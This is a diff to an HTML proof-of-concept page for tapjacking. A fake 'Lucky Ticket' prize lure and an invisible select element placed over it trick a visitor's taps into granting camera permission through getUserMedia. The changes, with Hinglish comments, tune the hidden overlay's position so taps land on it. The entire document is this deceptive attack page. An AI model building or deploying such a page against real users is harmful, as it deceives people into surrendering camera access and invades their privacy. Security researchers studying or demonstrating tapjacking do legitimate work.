@@ -3,14 +3,17 @@
 <head>
   <title>Tapjacking Permission POC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  
   <style>
     body {
       margin: 0;
       height: 100vh;
       overflow: hidden;
       text-align: center;
-      margin: 30vh 10vw;
       background-color: #7242E3;
+
+      position: relative; /* 👈 important fix */
+      padding-top: 30vh;  /* 👈 margin ki jagah ye use kiya */
     }
 
     button {
@@ -25,7 +28,7 @@
     select {
       opacity: 0;
       position: absolute;
-      top: 0vh;   /* 👈 yaha change karke upar/niche adjust kar sakta hai */
+      top: 10%;   /* 👈 yaha change kar (5% = aur upar) */
       left: 50%;
       transform: translateX(-50%);
     }
@@ -34,7 +37,7 @@
   <script>
     function requestCameraPermission() {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function (stream) {
+        .then(function () {
           console.log('Camera permission granted.');
         })
         .catch(function (error) {
@@ -52,6 +55,7 @@
 </head>
 
 <body>
+
 <center>
   <button onclick="handleClick()">
     🎉 Click to Open Your Lucky Ticket and Double-Tap [🟩 = 🎁] the Green Box to Win a Free Gift! 🎉
@@ -59,7 +63,7 @@
 </center>
 
 <div>
-  <select id="selectme" ondblclick="handleDoubleClick()">
+  <select id="selectme">
     <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
     <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
     <option>🟥 🟥 🟥 🟥 🟥 🟥 🟥 🟥</option>
